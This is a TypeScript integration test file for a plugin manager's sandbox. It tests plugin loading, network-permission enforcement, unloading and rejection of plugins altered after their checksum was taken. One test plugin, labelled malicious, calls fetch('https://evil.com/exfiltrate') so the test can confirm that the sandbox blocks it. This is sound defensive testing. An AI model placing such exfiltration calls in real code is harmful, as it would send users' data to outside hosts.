/**
 * Plugin Workflow Integration Tests
 *
 * Tests plugin system end-to-end:
 * - Plugin installation
 * - Sandboxed execution
 * - Permission enforcement
 * - Plugin unloading
 */

import { describe, test, expect, beforeEach, afterEach } from "bun:test";
import { writeFileSync, mkdirSync, existsSync, rmSync } from "fs";
import { join } from "path";
import { homedir } from "os";
import { PluginManager } from "../../../services/plugin-manager.js";
import { computeChecksum } from "../../../../plugins/src/security.js";

const TEST_PLUGIN_BASE = join(homedir(), ".wabisabi", "integration-test-plugins");
let testCounter = 0;

function getTestPluginDir(): string {
  testCounter++;
  return join(TEST_PLUGIN_BASE, `integration-plugin-${testCounter}-${Date.now()}`);
}

describe("Plugin Workflow Integration", () => {
  let TEST_PLUGIN_DIR: string;
  let pluginManager: PluginManager;

  beforeEach(() => {
    TEST_PLUGIN_DIR = getTestPluginDir();
    mkdirSync(TEST_PLUGIN_DIR, { recursive: true });
    pluginManager = new PluginManager();
  });

  afterEach(() => {
    if (existsSync(TEST_PLUGIN_DIR)) {
      rmSync(TEST_PLUGIN_DIR, { recursive: true, force: true });
    }
  });

  test("should install and execute valid plugin", async () => {
    // Create a simple valid plugin
    const pluginPath = join(TEST_PLUGIN_DIR, "index.ts");
    const manifestPath = join(TEST_PLUGIN_DIR, "manifest.json");

    const pluginCode = `
export default {
  name: "test-integration-plugin",
  version: "1.0.0",
  description: "Integration test plugin",
  onLoad: async (ctx) => {
    ctx.logger.info("Plugin loaded successfully");
  }
};
`;

    writeFileSync(pluginPath, pluginCode);
    const checksum = computeChecksum(pluginPath);

    const manifest = {
      name: "test-integration-plugin",
      version: "1.0.0",
      description: "Test plugin",
      entry: "index.ts",
      checksum: {
        algorithm: "sha256",
        hash: checksum,
      },
      permissions: {
        network: false,
        filesystem: "none",
        process: false,
      },
    };

    writeFileSync(manifestPath, JSON.stringify(manifest, null, 2));

    // Load plugin
    await expect(pluginManager.loadPlugin(pluginPath)).resolves.toBeUndefined();

    // Verify plugin is loaded
    expect(pluginManager.listPlugins()).toContain("test-integration-plugin");
    expect(pluginManager.getPlugin("test-integration-plugin")).toBeDefined();
  });

  test("should enforce sandbox restrictions", async () => {
    // Create plugin that tries to violate sandbox
    const pluginPath = join(TEST_PLUGIN_DIR, "index.ts");
    const manifestPath = join(TEST_PLUGIN_DIR, "manifest.json");

    const pluginCode = `
export default {
  name: "malicious-plugin",
  version: "1.0.0",
  description: "Attempts sandbox violation",
  onLoad: async (ctx) => {
    try {
      // This should be blocked
      await fetch("https://evil.com/exfiltrate");
      ctx.logger.error("SECURITY FAILURE: Network access succeeded!");
    } catch (error) {
      if (error.message.includes("Network access denied")) {
        ctx.logger.info("Sandbox correctly blocked network access");
      } else {
        throw error;
      }
    }
  }
};
`;

    writeFileSync(pluginPath, pluginCode);
    const checksum = computeChecksum(pluginPath);

    const manifest = {
      name: "malicious-plugin",
      version: "1.0.0",
      description: "Test plugin",
      entry: "index.ts",
      checksum: {
        algorithm: "sha256",
        hash: checksum,
      },
      permissions: {
        network: false, // Deny network
        filesystem: "none",
        process: false,
      },
    };

    writeFileSync(manifestPath, JSON.stringify(manifest, null, 2));

    // Plugin should load but network access should be blocked inside
    await expect(pluginManager.loadPlugin(pluginPath)).resolves.toBeUndefined();
    expect(pluginManager.listPlugins()).toContain("malicious-plugin");
  });

  test("should unload plugin cleanly", async () => {
    // Create plugin with onUnload hook
    const pluginPath = join(TEST_PLUGIN_DIR, "index.ts");
    const manifestPath = join(TEST_PLUGIN_DIR, "manifest.json");

    const pluginCode = `
export default {
  name: "unload-test-plugin",
  version: "1.0.0",
  description: "Tests clean unload",
  onLoad: async (ctx) => {
    ctx.logger.info("Plugin loaded");
  },
  onUnload: async (ctx) => {
    ctx.logger.info("Plugin unloading");
  }
};
`;

    writeFileSync(pluginPath, pluginCode);
    const checksum = computeChecksum(pluginPath);

    const manifest = {
      name: "unload-test-plugin",
      version: "1.0.0",
      description: "Test plugin",
      entry: "index.ts",
      checksum: {
        algorithm: "sha256",
        hash: checksum,
      },
      permissions: {
        network: false,
        filesystem: "none",
        process: false,
      },
    };

    writeFileSync(manifestPath, JSON.stringify(manifest, null, 2));

    // Load plugin
    await pluginManager.loadPlugin(pluginPath);
    expect(pluginManager.listPlugins()).toContain("unload-test-plugin");

    // Unload plugin
    await pluginManager.unloadPlugin("unload-test-plugin");
    expect(pluginManager.listPlugins()).not.toContain("unload-test-plugin");
  });

  test("should reject tampered plugin", async () => {
    // Create plugin, then modify it after checksum
    const pluginPath = join(TEST_PLUGIN_DIR, "index.ts");
    const manifestPath = join(TEST_PLUGIN_DIR, "manifest.json");

    const originalCode = `
export default {
  name: "tampered-plugin",
  version: "1.0.0",
  description: "Original plugin"
};
`;

    writeFileSync(pluginPath, originalCode);
    const checksum = computeChecksum(pluginPath);

    const manifest = {
      name: "tampered-plugin",
      version: "1.0.0",
      description: "Test plugin",
      entry: "index.ts",
      checksum: {
        algorithm: "sha256",
        hash: checksum,
      },
      permissions: {
        network: false,
        filesystem: "none",
        process: false,
      },
    };

    writeFileSync(manifestPath, JSON.stringify(manifest, null, 2));

    // Tamper with plugin after checksum
    const tamperedCode = originalCode + "\n// MALICIOUS CODE\n";
    writeFileSync(pluginPath, tamperedCode);

    // Should reject due to checksum mismatch
    await expect(pluginManager.loadPlugin(pluginPath)).rejects.toThrow(/Checksum verification failed/);
  });
});
